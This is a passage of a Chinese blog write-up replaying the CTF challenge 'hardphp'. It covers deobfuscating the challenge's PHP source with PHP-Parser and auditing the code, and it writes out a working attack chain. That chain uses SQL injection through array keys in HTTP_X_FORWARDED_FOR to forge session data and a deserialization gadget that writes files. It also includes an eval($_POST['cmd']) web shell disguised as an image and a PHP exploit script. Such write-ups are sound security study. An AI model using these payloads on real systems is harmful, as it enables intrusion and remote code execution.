+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329144337313.png" alt="image-20200329144337313"></p>
+<p>发现这颗树可以分为四个结构，按照遍历树的顺序，leaveNode时是按a、b、c、d的顺序离开这四个节点，然后只要去找这样的节点，返回计算后的值，就可以去掉<code>-1 + (1 - 1) + (1 + (5 - 2) - (-1 + (4 - 1)))</code>这种格式的语句。</p>
+<p>然后解决函数嵌套的问题，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$v0 = [$arg4 / $arg2];</span><br><span class="line">$v1 = [<span class="string">'ceil'</span>, $v0];</span><br><span class="line">$v2 = call_user_func_array(<span class="string">'call_user_func_array'</span>, $v1);</span><br></pre></td></tr></table></figure>
+
+<p>创建一个数组funcName[] 来保存函数名，如funcName[v1]=’ceil’;</p>
+<p>创建一个数组arg[]来保存参数所在数组变量名，如arg[v1]=’v0’;</p>
+<p>创建一个数组count[]来保存每个函数的参数个数，如count[v0]=2;</p>
+<p>创建一个二维数组<code>param[][]</code>来保存函数的参数，如<code>param[v0][0]=$arg4 / $arg2;</code></p>
+<p>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RemoveCall</span> <span class="keyword">extends</span> <span class="title">NodeVisitorAbstract</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_funcName = [];</span><br><span class="line">    <span class="keyword">private</span> $_arg = [];</span><br><span class="line">    <span class="keyword">private</span> $_params = [];</span><br><span class="line">    <span class="keyword">private</span> $_count= [];</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">enterNode</span><span class="params">(Node $node)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Stmt\Expression &amp;&amp; <span class="comment">//获取函数名</span></span><br><span class="line">            $node-&gt;expr <span class="keyword">instanceof</span> Node\Expr\Assign &amp;&amp;<span class="comment">//如 $v1 = ['ceil', $v0]; 中的ceil</span></span><br><span class="line">            $node-&gt;expr-&gt;var <span class="keyword">instanceof</span> Node\Expr\Variable &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;expr <span class="keyword">instanceof</span> Node\Expr\Array_ &amp;&amp;</span><br><span class="line">            count($node-&gt;expr-&gt;expr-&gt;items) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Expr\ArrayItem &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">            <span class="comment">//之后发现有一些是后编写的函数，这里把他们加上</span></span><br><span class="line">            (function_exists($node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value) || </span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'err'</span> ||</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'arg'</span> ||</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'is_available_classname'</span> ||</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'_err_router'</span> ||</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'http_build_query'</span> ||</span><br><span class="line">            $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'substr_count'</span>  )</span><br><span class="line">        ) &#123;<span class="comment">//保存函数名和参数相关信息</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_funcName[$node-&gt;expr-&gt;var-&gt;name] = $node-&gt;expr-&gt;expr-&gt;items[<span class="number">0</span>]-&gt;value-&gt;value;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_arg[$node-&gt;expr-&gt;var-&gt;name] = $node-&gt;expr-&gt;expr-&gt;items[<span class="number">1</span>]-&gt;value-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (</span><br><span class="line">            $node <span class="keyword">instanceof</span> Node\Stmt\Expression &amp;&amp;<span class="comment">//huoq</span></span><br><span class="line">            $node-&gt;expr <span class="keyword">instanceof</span> Node\Expr\Assign &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;var <span class="keyword">instanceof</span> Node\Expr\Variable &amp;&amp;</span><br><span class="line">            $node-&gt;expr-&gt;expr <span class="keyword">instanceof</span> Node\Expr\Array_ &amp;&amp;</span><br><span class="line">            count($node-&gt;expr-&gt;expr-&gt;items) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            $count=count($node-&gt;expr-&gt;expr-&gt;items);</span><br><span class="line">            <span class="comment">//保存函数参数个数和值</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_count[$node-&gt;expr-&gt;var-&gt;name] = $count;</span><br><span class="line">            $i=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>($count)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_params[$node-&gt;expr-&gt;var-&gt;name][]=$node-&gt;expr-&gt;expr-&gt;items[$i]-&gt;value;</span><br><span class="line">                $i+=<span class="number">1</span>;</span><br><span class="line">                $count-=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leaveNode</span><span class="params">(Node $node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Plus &amp;&amp; <span class="comment">//去掉 -2 + (4 - 0) + (-4 + (11 - 3) - (1 + (6 - 3)))</span></span><br><span class="line">            $node-&gt;right <span class="keyword">instanceof</span> Node\Expr\BinaryOp\Minus &amp;&amp;</span><br><span class="line">            $node-&gt;right-&gt;right <span class="keyword">instanceof</span> Node\Scalar\LNumber</span><br><span class="line">         ) &#123;</span><br><span class="line">            <span class="keyword">if</span>($node-&gt;left <span class="keyword">instanceof</span> Node\Expr\UnaryMinus)&#123;</span><br><span class="line">                $value1 = <span class="number">0</span> - $node-&gt;left-&gt;expr-&gt;value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $value1 = $node-&gt;left-&gt;value;</span><br><span class="line">            <span class="keyword">if</span>($node-&gt;right-&gt;left <span class="keyword">instanceof</span> Node\Expr\UnaryMinus)&#123;</span><br><span class="line">                $value2 = <span class="number">0</span> - $node-&gt;right-&gt;left-&gt;expr-&gt;value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $value2 = $node-&gt;right-&gt;left-&gt;value;</span><br><span class="line">            $value = $value1 + ($value2 - $node-&gt;right-&gt;right-&gt;value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node\Scalar\LNumber($value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($node <span class="keyword">instanceof</span> Node\Expr\FuncCall &amp;&amp; </span><br><span class="line">            $node-&gt;name <span class="keyword">instanceof</span> Node\Name &amp;&amp;  </span><br><span class="line">            is_string($node-&gt;name-&gt;parts[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            $node-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">'call_user_func_array'</span> &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>] <span class="keyword">instanceof</span> Node\Arg &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value <span class="keyword">instanceof</span> Node\Scalar\String_ &amp;&amp;</span><br><span class="line">            $node-&gt;args[<span class="number">0</span>]-&gt;value-&gt;value == <span class="string">'call_user_func_array'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                var_dump(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]);</span><br><span class="line">                <span class="comment">//var_dump($this-&gt;_params);</span></span><br><span class="line">            	<span class="comment">//根据函数参数个数，修改函数对应的节点。</span></span><br><span class="line">                <span class="keyword">switch</span>(<span class="keyword">$this</span>-&gt;_count[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]));</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]),</span><br><span class="line">                        [<span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">0</span>])]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]),</span><br><span class="line">                        [<span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">0</span>]), <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">1</span>])]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]),</span><br><span class="line">                        [<span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">0</span>]), <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">1</span>])</span><br><span class="line">                        , <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">2</span>])]);</span><br><span class="line">                        <span class="keyword">break</span>;  </span><br><span class="line">                    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Node\Expr\FuncCall(<span class="keyword">new</span> Node\Name(<span class="keyword">$this</span>-&gt;_funcName[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]),</span><br><span class="line">                        [<span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">0</span>]), <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">1</span>])</span><br><span class="line">                        , <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">2</span>]), <span class="keyword">new</span> Node\Arg(<span class="keyword">$this</span>-&gt;_params[<span class="keyword">$this</span>-&gt;_arg[$node-&gt;args[<span class="number">1</span>]-&gt;value-&gt;name]][<span class="number">3</span>])]);</span><br><span class="line">                         <span class="keyword">break</span>;   </span><br><span class="line">                &#125;     </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后的结果</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329150819548.png" alt="image-20200329150819548"></p>
+<p>可以看到已经大致还原了原来的代码，还是有一些其他的瑕疵，如无用的语句没有去掉，但是应该不会太影响进行代码审计。完整的代码会放到我的<a href="https://github.com/mount4in" target="_blank" rel="noopener">github上</a>。</p>
+<h1 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h1><p>利用前面的方法解混淆所有的源码后，进行代码审计，可以看到源码的架构和2018xnuca的hardphp很像，都是采用了MVC的模型，然后自定义Session存储函数，利用session_set_save_handler()设置用户自定义会话存储函数，将session数据存储到老数据库中。那道题有两种解法，其中一个非预期就是zsh师傅的解法，然后对比这道题，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329152251659.png" alt="image-20200329152251659"></p>
+<p>大致的功能有登录、注册、文件上传、Post Message。首先了解下<a href="https://www.php.net/manual/zh/function.session-set-save-handler.php" target="_blank" rel="noopener">用户自定义会话存储函数</a>，</p>
+<blockquote>
+<p><strong>session_set_save_handler()</strong> 设置用户自定义 会话存储函数。 如果想使用 PHP 内置的会话存储机制之外的方式， 可以使用本函数。 例如，可以自定义会话存储函数来将会话数据存储到数据库。</p>
+</blockquote>
+<blockquote>
+<p>会话开始的时候，PHP 会调用 <code>open</code> 管理器，然后再调用 <code>read</code> 回调函数来读取内容，该回调函数返回已经经过编码的字符串。 然后 PHP 会将这个字符串解码，并且产生一个数组对象，然后保存至 <code>$_SESSION</code> 超级全局变量。</p>
+</blockquote>
+<blockquote>
+<p>当 PHP 关闭的时候（或者调用了 <code>session_write_close()</code> 之后）， PHP 会对 <code>$_SESSION</code> 中的数据进行编码， 然后和会话 ID 一起传送给 <code>write</code> 回调函数。 <code>write</code> 回调函数调用完毕之后，PHP 内部将调用 <code>close</code> 回调函数。</p>
+</blockquote>
+<blockquote>
+<p>销毁会话时，PHP 会调用 <code>destroy</code>回调函数。</p>
+</blockquote>
+<blockquote>
+<p>根据会话生命周期时间的设置，PHP 会不时地调用 <code>gc</code> 回调函数。 该函数会从持久化存储中删除超时的会话数据。 超时是指会话最后一次访问时间距离当前时间超过了 <code>$lifetime</code> 所指定的值。</p>
+</blockquote>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329155825898.png" alt="image-20200329155825898"></p>
+<p>然后进行代码审计 ，文件上传点改了，加了限制，不能上传php文件。然后xnuca的sql注入点还是可以用，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329155328080.png" alt="image-20200329155328080"></p>
+<p>登录的时候会调用arg()取HTTP_X_FORWARDED_FOR 和UA等信息,跟进arg()函数</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329160728655.png" alt="image-20200329160728655"></p>
+<p>依次从<code>$_SERVER,$_REQUEST</code>中取值，传给Session类实例化，然后然后将实例化的对象序列化赋给<code>$_SESSION</code>，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329161222951.png" alt="image-20200329161222951"></p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329161137213.png" alt="image-20200329161137213"></p>
+<p>因为在Controller的构造函数中调用了init()函数，init()函数中设置了自定义的会话存储，然后调用了sesson_start()函数，然后看MySessionHandler中的write()函数，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329161701199.png" alt="image-20200329161701199"></p>
+<p>从上面可以知道write函数是在php结束或调用<code>session_write_close()</code>后执行的，它的第一个参数为sessionid，就是PHPSESSID。第二个参数是序列化后的字符串，默认为 session.serialize_handler设定值为php，序列化后的格式为 键名 竖线 serialize后的内容。然后这里对第二个参数即为之前实例化Session对象，进行两次序列化后的数据，第一次是serialize()函数对Session对象的序列化，第二次是Session机制对上一次序列化后返回字符串的序列化。</p>
+<p>然后可以看到源码对POST、GET、REQUEST 进行了escape()处理，跟进escape函数</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329163030942.png" alt="image-20200329163030942"></p>
+<p>进行了替换，这里吹一下zsh师傅，想到了用POST传HTTP_X_FORWARDED_FOR[]数组，这里替换只检测了post、get、request的值，而没有检测键值。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329163945162.png" alt="image-20200329163945162"></p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329163915197.png" alt="image-20200329163915197"></p>
+<p>发现可以注入，那么我们就可以伪造session数据了，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329165450543.png" alt="image-20200329165450543">)可以知道，PHP会自动反序列化read()函数返回的字符串，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329165650511.png" alt="image-20200329165650511">)read()函数返回的就是数据库中存储的data字段，然后寻找反序列化的利用点，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329170816130.png" alt="image-20200329170816130"></p>
+<p>如上图，可以找到一个写任意文件的利用点，这里waf掉了&lt;?php ，可以通过短标签来绕过，然后上传一个内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>的图片，在首页可以得到图片在服务器上的文件名，</p>
+<p>然后编写exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $err = [];</span><br><span class="line">    <span class="keyword">protected</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($up)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;err = <span class="keyword">array</span>(<span class="string">"/var/www/html/img/upload/air5f878bshuwonslz1lmtce1j9nt8zf.jpg"</span> =&gt; <span class="string">"shell.php"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $up;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Upload();</span><br><span class="line">$logger = <span class="keyword">new</span> Logger($upload);</span><br><span class="line">$d = urlencode(serialize($logger));</span><br><span class="line">$e = str_replace(<span class="string">"%00"</span>,<span class="string">"',0x00,'"</span>,$d);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'HTTP_X_FORWARDED_FOR[\',data%3dconcat(\'data|'</span>.$e.<span class="string">'\')%23\']=123'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后发送两遍，第二遍触发反序列化</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329171758795.png" alt="image-20200329171758795"></p>
+<p>然后在/img/upload/文件夹下生成shell.php，然而并不能利用，因为在upload文件夹下有.htaccess文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off;</span><br></pre></td></tr></table></figure>
+
+<p>禁止了php文件执行，那么只能寻找include之类的文件包含来利用了，然后发现core.php中有类自动加载器，并且有include文件包含。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329172720885.png" alt="image-20200329172720885"></p>
+<p>然后寻找那里有使用了未定义的类，</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329174200228.png" alt="image-20200329174200228"></p>
+<p>每个接口差不多都有一个$v2变量的getTime()静态方法的调用，$v2来源于$_SESSION[‘data’]中数据的反序列化，如果$v2为一个字符串，就可以调用字符串对应的类的静态方法，那么这里如果$v2为一个未定义的类，就会触发前面的类加载器，包含shell。然后伪造session的data。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329175736213.png" alt="image-20200329175736213"></p>
+<p>另外也可以发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;aaa&amp;password&#x3D;aaa&amp;HTTP_X_FORWARDED_FOR[&#39;,data%3dconcat(&#39;data|O:5:&quot;shell&quot;:0:&#123;&#125;&#39;)%23&#39;]&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>本地测试后，这种方式不是通过$v2调用静态方法触发的，猜测是在unserialize时接收的参数是一个类对象，然后触发的类自动加载器。</p>
+<p>之后访问/?s=img/upload就可以得到shell了。</p>
+<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329180252026.png" alt="image-20200329180252026"></p>
+<p>参考链接</p>
+<p><a href="https://ganlvtech.github.io/2019/03/01/enphp-decode/" target="_blank" rel="noopener">https://ganlvtech.github.io/2019/03/01/enphp-decode/</a></p>
+<p><a href="https://xz.aliyun.com/t/3453" target="_blank" rel="noopener">https://xz.aliyun.com/t/3453</a></p>
+<p><a href="https://xz.aliyun.com/t/3428#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3428</a></p>
+<p><a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/42</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/03/29/高校战“疫”hardphp复现/" target="_blank" title="高校战役hardphp复现">http://mount4in.github.io/2020/03/29/高校战“疫”hardphp复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/" data-id="ck99763s3000gmwsh7iak462q"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP-Parser%E6%B7%B7%E6%B7%86/" rel="tag">PHP-Parser混淆</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/04/12/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E9%A2%98%E8%A7%A3/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
